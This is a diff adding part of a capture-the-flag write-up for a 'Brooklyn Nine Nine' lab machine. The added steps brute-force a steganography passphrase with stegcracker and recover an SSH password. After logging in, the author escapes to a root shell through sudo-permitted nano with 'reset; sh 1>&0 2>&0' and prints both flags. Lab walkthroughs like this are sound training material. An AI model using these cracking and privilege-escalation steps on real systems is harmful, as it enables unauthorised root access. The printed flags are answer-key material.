@@ -104,7 +104,103 @@ The file is protected with a passphrase, so I’ll use stegcracker to brute forc
 ```
 
 ```
+$ stegcracker Downloads/brooklyn99.jpg
+StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2024 - Luke Paris (Paradoxis)
+
+StegCracker has been retired following the release of StegSeek, which 
+will blast through the rockyou.txt wordlist within 1.9 second as opposed 
+to StegCracker which takes ~5 hours.
+
+StegSeek can be found at: https://github.com/RickdeJager/stegseek
+
+No wordlist was specified, using default rockyou.txt wordlist.
+Counting lines in wordlist..
+Attacking file 'Downloads/brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
+Successfully cracked file with password: admin
+Tried 20394 passwords
+Your file has been written to: Downloads/brooklyn99.jpg.out
+admin
+```
 
 ```
+cat Downloads/brooklyn99.jpg.out       
+Holts Password:
+fluffydog12@ninenine
+
+Enjoy!!
+```
+
+**Using the credentials found to access the machine via SSH**
+
+```
+ssh holt@$IP
+The authenticity of host '10.10.200.49 (10.10.200.49)' can't be established.
+ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:3: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.200.49' (ED25519) to the list of known hosts.
+holt@10.10.200.49's password: 
+Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
+holt@brookly_nine_nine:~$ 
+```
+Was able to get the user flag
+
+```
+holt@brookly_nine_nine:~$ ls
+nano.save  user.txt
+holt@brookly_nine_nine:~$ cat user.txt 
+ee11cbb19052e40b07aac0ca060c23ee
+
+```
+
+**Escalating privileges in a Linux Machine**
+
+```
+holt@brookly_nine_nine:~$ sudo -l
+Matching Defaults entries for holt on brookly_nine_nine:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano
+
+```
+
+The sudo -l command output shows that the user holt can run nano as root without needing to enter a password.
+
+To exploit this, I decided to run a shell from within the nano text editor by following these steps:
+
+First, I ran nano as sudo:
+
+```
+holt@brookly_nine_nine:~$ sudo /bin/nano
+```
+
+To spawn a root shell from within nano:
+
+  - Once inside nano, press Ctrl+R (to read a file).
+  - Then press Ctrl+X.
+  - At the prompt, enter the following command to spawn a root shell:
+
+```
+reset; sh 1>&0 2>&0
+```
+
+With the root shell acquired, I was able to obtain the root flag:
+
+```
+# cat root/root.txt
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a9f0ea7bb98050796b649e85481845
+
+```
+
+
+
+
+
+
 
 
